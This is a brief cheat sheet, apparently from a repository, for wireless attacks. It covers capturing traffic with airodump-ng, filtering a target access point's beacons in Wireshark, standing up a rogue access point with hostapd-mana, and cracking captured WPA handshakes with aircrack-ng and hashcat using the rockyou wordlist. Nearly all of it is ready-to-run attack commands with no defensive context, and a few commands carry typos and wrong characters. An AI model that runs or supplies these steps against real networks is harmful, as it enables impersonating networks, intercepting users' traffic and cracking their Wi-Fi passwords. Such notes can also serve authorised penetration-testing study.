
Instructions for creating a rogue AP.

### Discovery
```bash
sudo airodump-ng -w capturename –output-format pcap wlan0mon
```
**Wireshark Filters:**
```bash
wlan.fc.type_subtype == 0x08 #Broadcast Frames
wlan.ssid == “apname” #AP name
```
Filters can be appended to filter for broadcast frames from a specific AP:
```bash
wlan.fc.type_subtype == 0x08 && wlan.ssid == “apname”
```
The interesting parts are in Tag: Vendor Specific: & Tag: RSN: Information

### Creating a Rogue AP
Hostapd-mana template location:
```bash
/etc/hostapd-mana/hostapd-mana.conf
```
Or you may download the hostapd-mana.config in this repository and modify to your needs.

Start hostapd-mana:
```bash
sudo hostapd-mana hostapd-mana.conf
```

### Cracking .hccapx Files
**aircrack:**
```bash
aircrack-ng name.hccapx -w /wordlist/rockyou.txt
```
If you run into errors, you may try:
```bash
aircrack-ng name.hccapx -e ESSID -w /wordlist/rockyou.txt
```
**hashcat:**
```
hashcat -m 2500 capture.hccapx /usr/share/worlists/rockyou.txt
```
